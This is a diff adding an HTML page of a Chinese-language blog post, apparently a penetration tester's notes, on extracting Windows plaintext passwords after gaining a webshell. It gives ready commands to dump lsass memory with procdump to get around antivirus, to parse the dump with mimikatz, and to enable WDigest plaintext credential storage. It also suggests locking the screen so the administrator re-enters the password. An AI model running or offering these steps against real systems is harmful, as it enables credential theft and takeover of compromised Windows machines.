@@ -1,0 +1,185 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    
+<meta charset="utf-8" >
+
+<title>简单两步抓取Windwos明文密码 | Mari0er&#39;s Blog</title>
+<meta name="description" content="">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://mari0er.top/favicon.ico?v=1768205765236">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://mari0er.top/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+      <div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="https://mari0er.top">
+        <img class="avatar" src="https://mari0er.top/images/avatar.png?v=1768205765236" alt="" width="32px" height="32px">
+      </a>
+      <a href="https://mari0er.top">
+        <h1 class="site-title">Mari0er&#39;s Blog</h1>
+      </a>
+    </div>
+    <div class="right">
+      <transition name="fade">
+        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
+      </transition>
+    </div>
+  </div>
+</div>
+
+<transition name="fade">
+  <div class="menu-container" style="display: none;" v-show="menuVisible">
+    <div class="menu-list">
+      
+        
+          <a href="/" class="menu purple-link">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="menu purple-link">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="menu purple-link">
+            标签
+          </a>
+        
+      
+        
+          <a href="https://mari0er.top/post/about.html" class="menu purple-link">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+</transition>
+
+
+      <div class="content-container">
+        <div class="post-detail">
+          
+            <div class="feature-container" style="background-image: url('https://tuchuang.looklook.workers.dev/0102/logo.jpg')">
+            </div>
+          
+          <h2 class="post-title">简单两步抓取Windwos明文密码</h2>
+          <div class="post-info post-detail-info">
+            <span><i class="icon-calendar-outline"></i> 2019-08-28</span>
+            
+              <span>
+                <i class="icon-pricetags-outline"></i>
+                
+                  <a href="https://mari0er.top/tag/procdump/">
+                    procdump
+                    
+                      ，
+                    
+                  </a>
+                
+                  <a href="https://mari0er.top/tag/mi-ma/">
+                    密码
+                    
+                  </a>
+                
+              </span>
+            
+          </div>
+          <div class="post-content">
+            <p>  前几天渗透拿到了Webshell，在抓取管理员密码进行远程桌面时遇到了问题，这里记录一下。</p>
+<!--more-->
+<p>  本来想着直接上传mimikzta进行抓取，但是目标机器安装了360导致mimikzta直接被杀，问了一下大佬，可以直接利用Procdump工具抓取lsass.dmp,再拉回本地利用mimikzta进行破解。Procdump工具点击<a href="https://1drv.ms/u/s!Avl1qZqVOurQgiGzbY8yPdDWXfRj?e=k7DscL">这里</a>直接下载。</p>
+<h3 id="0x01">0x01</h3>
+<p>  说干就干，首先上传程序至服务器，然后直接执行如下命令即可</p>
+<pre><code>procdump64.exe -accepteula -ma lsass.exe lsass.dmp
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://tuchuang.looklook.workers.dev/0102/procdump1.png" alt="procdump" loading="lazy"></figure>
+<h3 id="0x02">0x02</h3>
+<p>  直接将lsass.dmp拖回本地利用mimikzta进行破解，(此时得用管理员权限运行)，有了密码直接远程登录搞定。</p>
+<pre><code>mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://tuchuang.looklook.workers.dev/0102/pass1.jpg" alt="pass" loading="lazy"></figure>
+<h3 id="0x03">0x03</h3>
+<p>  若遇到破解出来密码为null的情况，可以先修改注册表让其以明文保存密码，然后需要想办法让管理员重新以密码登录，建议锁屏。</p>
+<pre><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
+</code></pre>
+<blockquote>
+<p>作者： Mari0er<br>
+链接： https://mari0er.top/post/procdump.html<br>
+版权： 本博客所有文章除特别声明外，均采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！！</p>
+</blockquote>
+
+          </div>
+        </div>
+
+        
+          <div class="next-post">
+            <a class="purple-link" href="https://mari0er.top/post/kms.html/">
+              <h3 class="post-title">
+                下一篇：自建KMS服务器
+              </h3>
+            </a>
+          </div>
+          
+      </div>
+
+      
+
+      <div class="site-footer">
+  <div class="slogan"></div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+  待人友善是修养 独来独往是性格 | <a class="rss" href="https://mari0er.top/atom.xml" target="_blank">RSS</a>
+</div>
+
+
+    </div>
+    <script type="application/javascript">
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
